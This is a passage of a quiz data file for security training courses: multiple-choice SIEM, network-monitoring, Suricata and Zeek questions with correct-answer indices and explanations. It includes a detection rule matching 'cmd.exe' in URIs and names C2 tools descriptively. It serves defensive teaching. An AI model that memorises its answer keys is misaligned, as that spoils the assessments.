          "SigninLogs | where TimeGenerated > ago(24h) | where ResultType == 0 | where AuthenticationDetails has 'Phone call' | where LocationDetails.countryOrRegion in ('XX','YY') | project UserPrincipalName, IPAddress, AuthenticationDetails, LocationDetails"
        ],
        correctAnswer: 3,
        explanation: "The correct KQL (D) filters by time, success status, the specific MFA factor ('Phone call'), and country codes to target the SIM-swap pattern, projecting the required context fields for triage."
      },
      {
        id: "siem-q5-21",
        difficulty: "hard",
        tags: ["Detection Gap"],
        scenario: "ATT&CK Navigator overlay shows your detection covers Execution and Defense Evasion well, but Credential Access and Lateral Movement are mostly empty.",
        question: "What does this tell you, and what is the next action?",
        options: [
          "Coverage is well-balanced since Execution and Defense Evasion detections catch most attacker activity in practice.",
          "Build detections for Credential Access (LSASS, Kerberoasting, DCSync) and Lateral Movement (anomalous SMB/RDP) as top priorities.",
          "Delete the existing Execution rules to free up resources for building Credential Access detections.",
          "Buy additional storage to accommodate the new log sources needed for Credential Access and Lateral Movement coverage."
        ],
        correctAnswer: 1,
        explanation: "Empty sections in lateral movement and credential access mean you miss the quiet middle stages of an compromise. Building targeted detections (B) is the required next step. Mass storage purchases (D) or rule deletes (C) are wrong."
      },
      {
        id: "siem-q5-22",
        difficulty: "medium",
        tags: ["Detection Rule Design"],
        scenario: "You propose a new rule. Reviewer checklist asks: 'How will an analyst know if this fires by mistake?'",
        question: "What must accompany the rule to answer that question?",
        options: [
          "Nothing additional — experienced analysts will determine whether each fire is a true or false positive independently.",
          "Documented false-positive patterns (known benign triggers) and a triage runbook with escalation criteria.",
          "Just the raw detection logic in the target query language — analysts do not need additional documentation.",
          "A humorous comment in the rule body to make it memorable and easier for junior analysts to recall during triage."
        ],
        correctAnswer: 1,
        explanation: "Detections must ship with a runbook and documented FP profile (B) to ensure the SOC can effectively triage alerts. Relying on raw query code (C) or tribal knowledge (A) increases MTTR."
      },
      {
        id: "siem-q5-23",
        difficulty: "easy",
        tags: ["SOC Success"],
        scenario: "Leadership asks: 'What's the most important factor for SIEM success?'",
        question: "Which answer is most accurate?",
        options: [
          "The most expensive platform available — enterprise-grade SIEMs provide capabilities that justify the cost premium.",
          "Ingesting the maximum possible data volume — broader coverage ensures no relevant security event goes undetected.",
          "Full automation with zero human involvement — removing analyst subjectivity improves detection consistency and speed.",
          "Skilled analysts and engineers who understand the environment, write and tune detections, and run a disciplined lifecycle."
        ],
        correctAnswer: 3,
        explanation: "SIEM maturity is driven by skilled personnel managing the detection lifecycle (D). Buying expensive tools (A), over-collecting data (B), or trying to automate human analysis entirely (C) fails without engineering talent."
      },
      {
        id: "siem-q5-24",
        difficulty: "hard",
        tags: ["End-to-End"],
        scenario: "An alert fires at 03:14: 'PowerShell EncodedCommand executed from winword.exe child process on FIN-HR-04 (CFO laptop).' Walk the optimal end-to-end SOC flow.",
        question: "Which sequence is correct?",
        options: [
          "Acknowledge the alert in the ticketing system, assign it to a senior analyst, and close the ticket by end of shift.",
          "Triage (enrich asset, user, EDR tree) → Contain (isolate host, force re-auth) → Investigate (decode PS, hunt parent doc, pivot C2 domain) → Eradicate → Recover → Lessons Learned.",
          "Page the analyst, wait for them to investigate manually at their own pace, and close after 48 hours regardless of findings.",
          "Mark the alert as a false positive since PowerShell execution from Office processes is common in enterprise environments."
        ],
        correctAnswer: 1,
        explanation: "The SANS IR loop (B) dictates: Triage, Containment (EDR isolation), Investigation (decoding PS, C2 pivot), Eradication, Recovery, and Lessons Learned. Vague triage or ignoring critical alerts (D) leads to compromise."
      },
      {
        id: "siem-q5-25",
        difficulty: "medium",
        tags: ["Culture"],
        scenario: "After 6 months, your SOC ships: 60 actionable alerts/day (was 4,000), 92% TP rate (was 11%), MTTD 14 min (was 6h), 100% ATT&CK-mapped with quarterly gap review. Leadership asks: 'How?'",
        question: "What is the honest answer?",
        options: [
          "Purchased a more capable SIEM platform with better default rules and built-in machine learning capabilities.",
          "Treated detection as engineering: Sigma-first rules in Git with CI replay tests, risk-based alerting, ATT&CK-driven coverage, runbooks per rule, tiered storage, and ruthless tuning cadence.",
          "Hired 50 additional analysts to handle the alert volume and reduce per-analyst workload across the team.",
          "Disabled most of the noisy alerts to reduce volume and manually tuned the threshold on the remainder."
        ],
        correctAnswer: 1,
        explanation: "Mature SOCs win by engineering discipline applied to detection: source control, tests, code review, lifecycle management, measurable outcomes. Tooling enables it; discipline produces the results."
      }
    ]
  },

  // ===== Network Security Monitoring Course Quizzes =====
  {
    quizId: "nsm-q1",
    courseId: "network-security-monitoring",
    title: "NSM Foundations",
    description: "Scenario-based assessment of NSM principles, visibility strategies, and sensor placement.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q1-1",
        difficulty: "easy",
        tags: ["NSM", "Visibility", "Architecture"],
        scenario: "You inherit a SOC that only ingests firewall deny logs and endpoint AV alerts. During an IR engagement, the responder asks: 'Which internal hosts did the C2 beacon talk to laterally after initial access?' You cannot answer.",
        question: "Which capability gap does this most directly expose?",
        options: [
          "Lack of endpoint disk encryption",
          "Lack of east-west network visibility (internal traffic monitoring)",
          "Insufficient firewall rule documentation",
          "Missing threat intel feeds"
        ],
        correctAnswer: 1,
        explanation: "Perimeter deny logs and AV alerts only cover north-south blocks and known-bad files. NSM's core value is east-west visibility — full session metadata for lateral movement, pivoting, and internal C2 that never touches the perimeter."
      },
      {
        id: "nsm-q1-2",
        difficulty: "easy",
        tags: ["Sensor Placement", "SPAN", "TAP"],
        scenario: "Your network team offers two options to feed a new Zeek sensor: (a) a SPAN/mirror port on the core switch shared with 3 other tools, or (b) a passive aggregation TAP dedicated to security.",
        question: "Which is preferred for production NSM and why?",
        options: [
          "SPAN — cheaper and mirrors all VLANs automatically",
          "SPAN — because TAPs cannot see VLAN tags",
          "TAP — dedicated, non-oversubscribed, no dropped frames under load or switch CPU pressure",
          "Either — modern switches never drop SPAN traffic"
        ],
        correctAnswer: 2,
        explanation: "SPAN ports are best-effort and dropped first under switch CPU or oversubscription. TAPs are passive, deterministic, and don't compete with production forwarding — essential for evidentiary-quality capture."
      },
      {
        id: "nsm-q1-3",
        difficulty: "medium",
        tags: ["Encryption", "TLS", "Visibility"],
        scenario: "Leadership asks why you still need NSM when 92% of traffic is TLS 1.3 with ECH (Encrypted Client Hello).",
        question: "What is the strongest justification you can give?",
        options: [
          "TLS 1.3 is trivially decrypted with Wireshark",
          "Metadata (JA3/JA4, SNI where available, cert fingerprints, timing, byte counts, destination reputation, beacon jitter) still yields high-fidelity detections without payload decryption",
          "NSM is unnecessary once TLS 1.3 is deployed",
          "You should mandate all users disable TLS to restore visibility"
        ],
        correctAnswer: 1,
        explanation: "Modern NSM has shifted from payload inspection to encrypted-traffic analytics: TLS fingerprints (JA3/JA4/JA4S), certificate metadata, flow shape, periodicity, and destination reputation are highly effective against C2, tunneling, and beaconing even when payloads are opaque."
      },
      {
        id: "nsm-q1-4",
        difficulty: "medium",
        tags: ["Data Types", "PCAP", "Metadata"],
        scenario: "Storage budget forces you to keep only two of: full PCAP (7 days), Zeek conn/http/dns/ssl logs (90 days), Suricata alerts (1 year).",
        question: "Which two should you retain and why?",
        options: [
          "Full PCAP + Suricata alerts — payload evidence plus signature hits",
          "Zeek metadata + Suricata alerts — long retention of session context and detections, PCAP is nice-to-have but heaviest",
          "Full PCAP + Zeek metadata — most raw fidelity",
          "Suricata alerts only — everything else is redundant"
        ],
        correctAnswer: 1,
        explanation: "Zeek metadata delivers 90 days of investigable session context at a fraction of PCAP cost, and Suricata alerts anchor detections over long windows. Full PCAP is invaluable but the first to sacrifice under budget because it's the most storage-heavy per hour."
      },
      {
        id: "nsm-q1-5",
        difficulty: "medium",
        tags: ["Kill Chain", "Detection"],
        scenario: "An intrusion produced: (1) recon nmap sweep, (2) exploit of a public web app, (3) reverse shell over HTTPS, (4) SMB lateral movement, (5) 3 GB HTTPS upload to a rare ASN.",
        question: "Which stage is NSM typically WEAKEST at detecting on its own?",
        options: [
          "Recon — port scans are trivial to see in conn logs",
          "Exploitation of a zero-day inside an encrypted POST body with no signature and no anomalous metadata",
          "Lateral SMB — visible in Zeek smb logs",
          "Exfiltration — visible as anomalous byte counts to rare destinations"
        ],
        correctAnswer: 1,
        explanation: "NSM shines at recon, C2 patterns, lateral movement, and exfil shape. An unknown exploit hidden inside an encrypted body with normal-looking metadata is the classic NSM blind spot — this is where EDR/app logs must fill the gap."
      },
      {
        id: "nsm-q1-6",
        difficulty: "medium",
        tags: ["Sensor Sizing", "Performance"],
        scenario: "A 10 Gbps sensor is dropping ~4% of packets during business hours. Suricata stats show 'kernel_drops' rising and CPU pinned on a few workers.",
        question: "Which remediation addresses the root cause most directly?",
        options: [
          "Increase disk retention for PCAP",
          "Enable AF_PACKET fanout / PF_RING / DPDK with more RX queues and pin workers to NUMA-local cores",
          "Reduce Suricata rules to zero",
          "Switch to signature-only mode and disable logging"
        ],
        correctAnswer: 1,
        explanation: "Packet drops on a saturated sensor are a capture-plane problem. Load-balancing across RX queues (AF_PACKET fanout, PF_RING, DPDK) and pinning workers to NUMA-local cores parallelizes work and eliminates the single-core bottleneck."
      },
      {
        id: "nsm-q1-7",
        difficulty: "hard",
        tags: ["Cloud NSM", "VPC"],
        scenario: "You're extending NSM into AWS. There are no physical TAPs available.",
        question: "Which combination gives the closest equivalent to on-prem NSM visibility?",
        options: [
          "CloudTrail only",
          "VPC Flow Logs for metadata + VPC Traffic Mirroring to a Zeek/Suricata sensor for deep inspection where required",
          "GuardDuty replaces all NSM needs",
          "S3 access logs"
        ],
        correctAnswer: 1,
        explanation: "VPC Flow Logs give ubiquitous 5-tuple metadata (cheap, broad); VPC Traffic Mirroring provides packet-level feeds to Zeek/Suricata for the subnets that warrant it. Together they approximate on-prem TAP+metadata coverage."
      },
      {
        id: "nsm-q1-8",
        difficulty: "hard",
        tags: ["Chain of Custody", "Forensics"],
        scenario: "A capture from your sensor may be introduced as evidence. During review, defense counsel asks how you know the PCAP wasn't modified.",
        question: "Which control most directly supports integrity/authenticity?",
        options: [
          "The file has a .pcap extension",
          "Cryptographic hash (SHA-256) recorded at capture time, stored in a write-once evidence log, with documented custody transfers",
          "The analyst 'remembers' downloading it",
          "The SIEM index makes it tamper-proof"
        ],
        correctAnswer: 1,
        explanation: "Evidentiary integrity requires a hash taken as close to capture as possible, immutably logged, plus a documented custody chain. Everything else is procedural hygiene around that anchor."
      },
      {
        id: "nsm-q1-9",
        difficulty: "hard",
        tags: ["Asymmetric Routing"],
        scenario: "Your sensor sees the client-to-server half of many TCP sessions but not the server-to-client half. Zeek conn logs show 'history' fields like 'S' with no 'h' and many 'missed_bytes'.",
        question: "What is the most likely root cause?",
        options: [
          "Suricata is misconfigured",
          "Asymmetric routing — return traffic egresses via a different path/uplink that the sensor does not TAP",
          "The clients are all offline",
          "TLS 1.3 hides return traffic"
        ],
        correctAnswer: 1,
        explanation: "One-sided flows and 'missed_bytes' are textbook symptoms of asymmetric routing. The fix is to aggregate all relevant uplinks into the sensor (packet broker / aggregation TAP) so both directions land on the same analysis stream."
      },
      {
        id: "nsm-q1-10",
        difficulty: "medium",
        tags: ["NSM vs IDS"],
        scenario: "A vendor pitches: 'Our IPS replaces your NSM stack — if it doesn't alert, nothing bad happened.'",
        question: "Which counter-argument is strongest?",
        options: [
          "Agree — signature IPS is comprehensive",
          "NSM's value is retrospective and investigative: rich metadata lets you answer new questions about past traffic (post-CVE hunts, IR scoping) that no real-time IPS can retroactively provide",
          "IPS cannot block traffic",
          "IPS is always cheaper"
        ],
        correctAnswer: 1,
        explanation: "IPS is a real-time filter tied to what was known at the time of the packet. NSM's persistent, structured record of who talked to whom, when, how much, and with what fingerprints is what enables retro-hunts, IR scoping, and threat-informed detection engineering."
      }
    ]
  },
  {
    quizId: "nsm-q2",
    courseId: "network-security-monitoring",
    title: "Packet Capture & Wireshark Tradecraft",
    description: "Scenario-driven PCAP triage, filter craft, and packet-level investigation.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q2-1",
        difficulty: "easy",
        tags: ["Wireshark", "Filters"],
        scenario: "You need every packet to/from 10.0.5.23 involving TCP/445 for the last hour and nothing else, from a live 10 Gbps span.",
        question: "Where should this filter live for correctness and performance?",
        options: [
          "Wireshark display filter only, capturing everything to disk",
          "As a BPF capture filter ('host 10.0.5.23 and tcp port 445') so the kernel discards uninteresting packets before write",
          "In Suricata rules",
          "In the firewall ACL"
        ],
        correctAnswer: 1,
        explanation: "Capture filters (BPF) run in-kernel and drop unwanted packets before they hit disk or user space — essential on a 10 Gbps link. Display filters only filter what you already captured."
      },
      {
        id: "nsm-q2-2",
        difficulty: "easy",
        tags: ["tcpdump", "BPF"],
        scenario: "You need to capture DNS queries for the string 'evil' anywhere in the payload during an incident.",
        question: "Which approach is most appropriate on the sensor host?",
        options: [
          "tcpdump -i eth0 -w dns.pcap 'udp port 53' — then grep the pcap with tshark/strings",
          "grep the raw NIC device",
          "Wireshark GUI on the production sensor",
          "Reboot the sensor"
        ],
        correctAnswer: 0,
        explanation: "Capture the constrained slice with a BPF filter to disk, then post-process with tshark/tcpdump/zeek. Running a GUI on production sensors is discouraged; grepping /dev/eth0 is nonsense."
      },
      {
        id: "nsm-q2-3",
        difficulty: "medium",
        tags: ["Wireshark", "TCP Analysis"],
        scenario: "Wireshark's Expert Info shows many 'TCP Previous segment not captured' and 'TCP Out-of-Order' messages for a session you're analyzing.",
        question: "What is the most defensible interpretation before drawing security conclusions?",
        options: [
          "The attacker is fragmenting packets deliberately",
          "The capture is likely incomplete or reordered (sensor drops, asymmetric routing, or misordered SPAN) — validate capture fidelity before interpreting the session",
          "The session is definitely benign",
          "This is proof of a covert channel"
        ],
        correctAnswer: 1,
        explanation: "Those expert messages are capture-quality signals as often as they are attacker behavior. Confirm sensor health, drops, and both directions are present before making security claims from the flow."
      },
      {
        id: "nsm-q2-4",
        difficulty: "medium",
        tags: ["Follow Stream", "HTTP"],
        scenario: "In an HTTP session Wireshark's Follow TCP Stream shows a base64 blob after 'Cookie:' that decodes to a serialized .NET object.",
        question: "What is the strongest hypothesis?",
        options: [
          "Normal session state",
          "Potential .NET deserialization payload — pivot to server logs and check for CVEs affecting the endpoint framework (e.g., ViewState, BinaryFormatter)",
          "Random noise",
          "TLS handshake"
        ],
        correctAnswer: 1,
        explanation: "Serialized .NET objects transmitted in cookies/headers are a known RCE vector (ViewState/BinaryFormatter). This warrants immediate server-side investigation and payload preservation."
      },
      {
        id: "nsm-q2-5",
        difficulty: "medium",
        tags: ["Wireshark", "SMB"],
        scenario: "You have a PCAP of suspected ransomware precursors. You want just the SMB2 write commands to file shares over the last 10 minutes.",
        question: "Which display filter is correct?",
        options: [
          "smb2.cmd == 9",
          "smb == write",
          "tcp.port == 445",
          "http contains 'smb'"
        ],
        correctAnswer: 0,
        explanation: "SMB2 command 9 is WRITE. 'tcp.port == 445' is too broad (includes reads, tree connects, negotiate); 'smb == write' isn't valid Wireshark syntax; HTTP is unrelated."
      },
      {
        id: "nsm-q2-6",
        difficulty: "medium",
        tags: ["File Carving", "tshark"],
        scenario: "You need to extract all objects transferred over HTTP from a 4 GB PCAP for malware triage.",
        question: "Which is the fastest correct approach on the CLI?",
        options: [
          "tshark -r file.pcap --export-objects http,./out/",
          "Manually copy hex bytes from Wireshark",
          "strings file.pcap > out.bin",
          "tcpdump -X file.pcap"
        ],
        correctAnswer: 0,
        explanation: "tshark's --export-objects reassembles TCP streams and writes each HTTP object as a file — the standard headless way to carve at scale. 'strings' loses structure; hex copying doesn't scale."
      },
      {
        id: "nsm-q2-7",
        difficulty: "hard",
        tags: ["JA3", "TLS Fingerprint"],
        scenario: "Two clients in the same subnet connect to the same IP:443. Wireshark shows identical ClientHello SNI = 'update.example.com' but different JA3 hashes.",
        question: "What is the most likely explanation?",
        options: [
          "They are the same process on both hosts",
          "Different TLS stacks/libraries (e.g., one is the OS updater using schannel, the other a malware sample using a custom Go/Python TLS stack) — JA3 encodes cipher/extension order, which differs by library",
          "One host is offline",
          "SNI is always forged"
        ],
        correctAnswer: 1,
        explanation: "JA3 hashes the client's TLS handshake parameters. Two libraries connecting to the same server produce distinct JA3s. This is why JA3/JA4 is powerful for spotting non-browser clients pretending to be legitimate updaters."
      },
      {
        id: "nsm-q2-8",
        difficulty: "hard",
        tags: ["Wireshark", "Statistics"],
        scenario: "You suspect beaconing inside a large PCAP. You want to see per-destination connection rate over time.",
        question: "Which Wireshark feature is most useful?",
        options: [
          "Follow Stream",
          "Statistics → Conversations, plus Statistics → I/O Graph filtered per destination, to reveal periodic intervals characteristic of beacons",
          "Preferences → Colors",
          "File → Export Specified Packets"
        ],
        correctAnswer: 1,
        explanation: "Conversations quantifies who-talked-to-whom; the I/O Graph plots packet/byte rate over time. Periodic spikes at fixed intervals to a destination are the beaconing signature."
      },
      {
        id: "nsm-q2-9",
        difficulty: "hard",
        tags: ["mergecap", "editcap"],
        scenario: "You have 40 rotating pcap files (100 MB each) captured across 6 hours and need to work on a single session that started at 03:14 UTC.",
        question: "Which workflow is most efficient?",
        options: [
          "Open all 40 in Wireshark simultaneously",
          "mergecap the relevant files → editcap -A/-B to slice by time window → open only the trimmed pcap in Wireshark",
          "Concatenate with cat",
          "Rename to .txt and grep"
        ],
        correctAnswer: 1,
        explanation: "mergecap correctly stitches pcaps preserving timestamps; editcap slices by time range. This yields a small, precise file for analysis instead of overwhelming Wireshark or corrupting headers with cat."
      },
      {
        id: "nsm-q2-10",
        difficulty: "medium",
        tags: ["Privacy", "Handling"],
        scenario: "A PCAP contains employee credentials submitted over plain HTTP to a compromised intranet form.",
        question: "What is the correct handling posture?",
        options: [
          "Post the PCAP to a public sandbox for analysis",
          "Treat as sensitive: restrict access, redact/rotate exposed credentials, follow evidence handling per policy, and never upload to third-party services without approval",
          "Email it to all analysts",
          "Delete immediately with no notification"
        ],
        correctAnswer: 1,
        explanation: "PCAPs frequently contain PII, credentials, and session tokens. Handle under evidence policy, restrict access, drive credential rotation, and never upload to public sandboxes without explicit authorization."
      }
    ]
  },
  {
    quizId: "nsm-q3",
    courseId: "network-security-monitoring",
    title: "Suricata Detection Engineering",
    description: "Realistic Suricata rule authoring, tuning, and IPS operations.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q3-1",
        difficulty: "easy",
        tags: ["Suricata", "Rule Syntax"],
        scenario: "You want to alert on any HTTP request to external hosts containing 'cmd.exe' in the URI.",
        question: "Which rule is syntactically and semantically correct?",
        options: [
          "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"Suspicious URI cmd.exe\"; http.uri; content:\"cmd.exe\"; nocase; sid:1000001; rev:1;)",
          "alert tcp any any -> any 80 (content:\"cmd.exe\";)",
          "drop ip any any -> any any (msg:\"bad\";)",
          "log http any -> any (uri:\"cmd.exe\";)"
        ],
        correctAnswer: 0,
        explanation: "The correct rule scopes direction, uses the http protocol parser with the http.uri sticky buffer, includes nocase, and provides sid/rev/msg — all Suricata requirements for a valid, maintainable rule."
      },
      {
        id: "nsm-q3-2",
        difficulty: "easy",
        tags: ["Suricata", "Actions"],
        scenario: "Suricata is deployed inline on an IPS interface. A rule uses action 'alert'.",
        question: "What happens when the rule matches?",
        options: [
          "The packet is dropped and the session reset",
          "An event is logged; the packet is NOT blocked — 'drop' or 'reject' is required to prevent traffic inline",
          "The connection is quarantined for 24 hours",
          "The user is emailed"
        ],
        correctAnswer: 1,
        explanation: "'alert' only logs. Inline blocking requires 'drop' (silent) or 'reject' (send RST/ICMP). Mixing these up is a common cause of 'why isn't the IPS blocking?' incidents."
      },
      {
        id: "nsm-q3-3",
        difficulty: "medium",
        tags: ["Suricata", "flowbits"],
        scenario: "You want to alert only when a client first POSTs to '/upload' AND later downloads a file matching a suspicious pattern in the same session.",
        question: "Which Suricata construct chains these two events?",
        options: [
          "threshold",
          "flowbits (set on the POST, isset on the download) to stitch stateful multi-step detections",
          "xbits: iprep",
          "pcre only"
        ],
        correctAnswer: 1,
        explanation: "flowbits let a first rule 'set' a marker on a flow and a second rule 'isset' to fire only if the marker exists — the standard way to build multi-step, in-flow detections."
      },
      {
        id: "nsm-q3-4",
        difficulty: "medium",
        tags: ["Suricata", "Performance"],
        scenario: "A rule using pcre against every HTTP body is causing high CPU on the sensor.",
        question: "Which optimization is best practice?",
        options: [
          "Remove all rules",
          "Anchor with a fast_pattern content match first (a cheap literal) and only fall through to pcre on candidates; scope with http.request_body and appropriate depth/offset",
          "Increase pcre recursion limits blindly",
          "Disable HTTP parsing"
        ],
        correctAnswer: 1,
        explanation: "Suricata's detection engine short-circuits on the fast_pattern content match; pcre should only run on pre-filtered candidates. Scoping to the right sticky buffer with depth/offset limits work further."
      },
      {
        id: "nsm-q3-5",
        difficulty: "medium",
        tags: ["Suricata", "Tuning"],
        scenario: "An ET rule fires 20,000 times per day on a legitimate vulnerability scanner in your DMZ.",
        question: "Which tuning approach is most maintainable?",
        options: [
          "Delete the rule entirely",
          "Suppress or threshold the rule for the scanner's source IP(s) via suppress/threshold.config, keeping detection elsewhere",
          "Increase timeLimit on the analyst queue",
          "Reboot the sensor daily"
        ],
        correctAnswer: 1,
        explanation: "Scoped suppression preserves detection for the rest of the environment while eliminating known-benign noise from an authorized scanner — the canonical Suricata tuning pattern."
      },
      {
        id: "nsm-q3-6",
        difficulty: "medium",
        tags: ["Suricata", "TLS"],
        scenario: "You want to detect connections to a known-bad server certificate hash regardless of SNI or IP.",
        question: "Which keyword should you use?",
        options: [
          "tls.sni",
          "tls.cert_fingerprint (SHA1 of the leaf cert) — resilient to IP rotation and SNI changes",
          "http.uri",
          "dns.query"
        ],
        correctAnswer: 1,
        explanation: "Cert fingerprints identify the actual TLS server certificate; attackers can rotate IPs and SNIs, but reusing the same cert leaves this fingerprint. This is a durable IOC when available."
      },
      {
        id: "nsm-q3-7",
        difficulty: "hard",
        tags: ["Suricata", "Bypass"],
        scenario: "An attacker fragments an HTTP request across many small TCP segments so signatures matching 'cmd.exe' on individual packets miss.",
        question: "Which Suricata capability defeats this?",
        options: [
          "Stateless per-packet inspection",
          "Stream reassembly + HTTP parser (rules run on reassembled application-layer buffers, not raw packets) — with adequate stream memory settings",
          "Disabling TCP",
          "Running Suricata on the client"
        ],
        correctAnswer: 1,
        explanation: "Suricata reassembles TCP streams and parses application protocols so signatures run against normalized buffers, defeating simple segmentation evasion. Adequate stream.memcap and reassembly settings are required."
      },
      {
        id: "nsm-q3-8",
        difficulty: "hard",
        tags: ["Suricata", "Lua"],
        scenario: "You need a detection that only fires when the JA3 hash matches one of ~500 known-bad hashes.",
        question: "Which approach scales best?",
        options: [
          "Write 500 individual rules",
          "Use a datasets/iprep-style set (ja3.hash; dataset:isset,ja3_bad;) or a Lua rule that checks against a hashed set — O(1) lookup per event",
          "Grep eve.json after the fact only",
          "Do nothing — 500 is too many"
        ],
        correctAnswer: 1,
        explanation: "Suricata datasets allow O(1) set membership checks against large lists (JA3s, SHA256s, URLs) inside a single rule — vastly more efficient than 500 sid entries."
      },
      {
        id: "nsm-q3-9",
        difficulty: "hard",
        tags: ["IPS Deployment"],
        scenario: "Before flipping Suricata from IDS to IPS on a production egress link, what is the single most important pre-flight check?",
        question: "Choose the strongest control:",
        options: [
          "Confirm all rules are 'alert' only, then flip",
          "Run in 'IDS + drop-audit' (or copy-mode) shadowing the traffic; verify no legitimate business flows would be dropped by current rule set, then enable inline drop on a curated subset",
          "Delete all rules",
          "Skip testing to save time"
        ],
        correctAnswer: 1,
        explanation: "Turning a rich alert ruleset into inline drops without shadow-testing is how outages happen. Shadow evaluation and staged enablement of a curated 'drop' subset is the safe path to IPS."
      },
      {
        id: "nsm-q3-10",
        difficulty: "medium",
        tags: ["Suricata", "eve.json"],
        scenario: "You're building SIEM correlation on Suricata eve.json.",
        question: "Which event_type set gives the richest correlation surface beyond just alerts?",
        options: [
          "alert only",
          "alert + http + dns + tls + fileinfo + flow — protocol metadata that lets you pivot from any alert into full session context",
          "flow only",
          "stats only"
        ],
        correctAnswer: 1,
        explanation: "Alerts alone answer 'did a rule fire?'. Protocol events (http/dns/tls/fileinfo/flow) let you enrich, pivot, and detect on metadata even where no rule matched — this is what makes Suricata a first-class NSM source, not just an IDS."
      }
    ]
  },
  {
    quizId: "nsm-q4",
    courseId: "network-security-monitoring",
    title: "Zeek Metadata & Scripting",
    description: "Zeek log pivots, UID correlation, and script-driven detections.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q4-1",
        difficulty: "easy",
        tags: ["Zeek", "conn.log"],
        scenario: "In conn.log you see: proto=tcp service=ssl duration=3612.4 orig_bytes=2048 resp_bytes=1873400000 conn_state=SF to a rare external ASN.",
        question: "What is the strongest hypothesis?",
        options: [
          "Normal HTTPS browsing",
          "Long-lived TLS session with massive server-to-client transfer — candidate for tunneled ingress or a large download; pivot to ssl.log and files.log for context",
          "SSH brute force",
          "DNS exfiltration"
        ],
        correctAnswer: 1,
        explanation: "conn_state SF (normally-terminated), hour-long duration, and ~1.8 GB responder bytes to a rare ASN is a classic large-egress/tunnel shape. Pivot via UID to ssl.log (JA3, cert, SNI) and files.log."
      },
      {
        id: "nsm-q4-2",
        difficulty: "easy",
        tags: ["Zeek", "UID"],
        scenario: "You have a Zeek alert referencing UID 'CxT4a91XyZ'.",
        question: "What does the UID enable?",
        options: [
          "Nothing — Zeek doesn't correlate logs",
          "A single connection identifier that joins conn.log, http.log, ssl.log, files.log, dns.log, notice.log etc. — pivot across every protocol log for the same session",
          "The user's Windows SID",
          "A firewall rule ID"
        ],
        correctAnswer: 1,
        explanation: "The Zeek UID is the primary key for a connection across every protocol log — it is what makes Zeek's metadata investigable at scale."
      },
      {
        id: "nsm-q4-3",
        difficulty: "medium",
        tags: ["Zeek", "dns.log"],
        scenario: "dns.log shows a host issuing 4,500 A-record queries per hour to subdomains of a single parent domain, each subdomain ~50 chars of base32-like text.",
        question: "What is the most likely activity?",
        options: [
          "Normal CDN behavior",
          "DNS tunneling / DNS-based C2 or exfil (Cobalt Strike DNS beacon, dnscat2, iodine) — high query volume + long unique subdomains encoding data",
          "Time sync",
          "Wi-Fi captive portal"
        ],
        correctAnswer: 1,
        explanation: "High rate + long high-entropy unique subdomains under one parent is the canonical DNS tunneling fingerprint. Pivot to conn.log for volume and to the resolver logs for scope."
      },
      {
        id: "nsm-q4-4",
        difficulty: "medium",
        tags: ["Zeek", "http.log"],
        scenario: "http.log entries show many POSTs to /gate.php with user_agent 'Mozilla/4.0' and short repeating request bodies to the same host every 60 seconds.",
        question: "What detection best characterizes this?",
        options: [
          "Legitimate browser telemetry",
          "HTTP beacon consistent with C2 (fixed cadence, small POSTs, ancient UA, gate.php-style endpoint) — pivot to conn history and files.log for tasked payloads",
          "Certificate transparency",
          "Kerberos"
        ],
        correctAnswer: 1,
        explanation: "Fixed-interval POSTs, tiny bodies, suspicious endpoint, and a stale UA is a textbook HTTP C2 beacon (many commodity RATs and older Cobalt Strike profiles). Correlate over UID for the whole picture."
      },
      {
        id: "nsm-q4-5",
        difficulty: "medium",
        tags: ["Zeek", "ssl.log"],
        scenario: "ssl.log shows subject='CN=localhost' issuer='CN=localhost' validation_status='self signed certificate' for a session on port 443 to an internet host.",
        question: "How should you triage?",
        options: [
          "Ignore — self-signed certs are always benign",
          "Alert / hunt: self-signed cert to a public destination on 443 is unusual and correlates with C2 frameworks (default Cobalt Strike, Metasploit profiles) — pivot to JA3/JA3S and destination reputation",
          "Add to allowlist",
          "It's DNS"
        ],
        correctAnswer: 1,
        explanation: "Legitimate public services present CA-signed certificates. Self-signed CN=localhost/example on a public endpoint is a strong C2 indicator, especially when combined with well-known JA3/JA3S signatures."
      },
      {
        id: "nsm-q4-6",
        difficulty: "medium",
        tags: ["Zeek", "files.log"],
        scenario: "files.log records a transferred file: mime_type='application/x-dosexec' source='HTTP' md5='<hash>' filename='update.exe' from a rare host.",
        question: "What is the correct next step?",
        options: [
          "Ignore all executables",
          "Hunt the hash across EDR and other Zeek files.log entries; pivot conn.log by UID for the delivery session; check destination reputation and JA3",
          "Delete the log",
          "Reboot the sensor"
        ],
        correctAnswer: 1,
        explanation: "files.log gives you the hash and delivery context. Cross-correlate with EDR to see execution, and Zeek pivots let you scope how many other hosts saw the same file."
      },
      {
        id: "nsm-q4-7",
        difficulty: "hard",
        tags: ["Zeek", "Scripting"],
        scenario: "You want a Zeek script that raises a NOTICE when a single source IP contacts more than 100 unique destination IPs on the same port within 60 seconds.",
        question: "Which Zeek primitive is best suited?",
        options: [
          "Custom awk script on conn.log",
          "SumStats framework (or a table with a 'when' expression) — designed for streaming, sliding-window aggregates across observations",
          "iptables",
          "A shell cron job"
        ],
        correctAnswer: 1,
        explanation: "Zeek's SumStats framework is purpose-built for high-throughput, in-cluster sliding-window aggregations — the right tool for rate/cardinality detections like scan behavior."
      },
      {
        id: "nsm-q4-8",
        difficulty: "hard",
        tags: ["Zeek", "Intel Framework"],
        scenario: "You have a threat-intel feed of ~50k domains, IPs, file hashes, and SSL cert fingerprints. You want automatic matches with rich context in notice.log.",
        question: "Which mechanism should you use?",
        options: [
          "Write a rule per indicator",
          "Zeek's Intel Framework (Intel::read_files) — supports multiple indicator types, cluster distribution, and cross-log matching by design",
          "Custom bash grep on logs",
          "Ignore intel entirely"
        ],
        correctAnswer: 1,
        explanation: "The Intel framework consumes tab-separated indicator files, matches across protocol events (dns.log, http.log, ssl.log, files.log, x509.log), and emits Intel::Notice — the right scale and integration point."
      },
      {
        id: "nsm-q4-9",
        difficulty: "hard",
        tags: ["Zeek Cluster"],
        scenario: "Your Zeek is dropping packets at peak. You inspect capture_loss.log and see loss>1% consistently on one worker.",
        question: "Which fix is architecturally correct?",
        options: [
          "Ignore capture_loss.log",
